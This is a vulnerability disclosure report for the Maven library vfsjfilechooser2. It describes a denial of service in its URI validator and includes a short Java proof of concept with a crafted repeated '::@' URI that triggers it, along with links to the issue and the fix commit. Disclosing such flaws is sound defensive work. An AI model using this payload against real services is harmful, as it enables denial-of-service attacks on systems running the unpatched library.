**Submission details:**

**Package Manager:** maven
**Affected module:** vfsjfilechooser2
**Link to published package:** https://github.com/fracpete/vfsjfilechooser2
**Link to GitHub repo:** https://github.com/fracpete/vfsjfilechooser2
**Other vulnerability type:** 
**Severity level:** High
**Module Description:** vfsjfilechooser2 is a mavenized fork of the dormant vfsjfilechooser project on sf.net 

**Vulnerability Description:**

It allows cause a denial of service when validating crafted invalid uris.

**Steps to reproduce:**

```java
import com.googlecode.vfsjfilechooser2.utils.VFSURIValidator;

public class Main {
    public static void main(String[] args) {
        VFSURIValidator v = new VFSURIValidator();
        String _uri = "ftp://:@::@::@::@::@::@::@::@::@::@::@::@::@::@::@::@::@::@::@::@::@::@::@::@::@::@::@::@::@::@::@::@::@::@::@::@::@::@::@::@::";
        System.out.println(v.isValid(_uri));
    }
}
```

You can execute `./PoC/Demovfsjfilechooser2/src/com/company/Main.java`

**Did I contact the maintainer:** Yes
**Did I open an issue:** Yes

**References:**

https://github.com/fracpete/vfsjfilechooser2/issues/7

https://github.com/fracpete/vfsjfilechooser2/commit/9c9f2c317f3de5ece60a3ae28c371e9796e3909b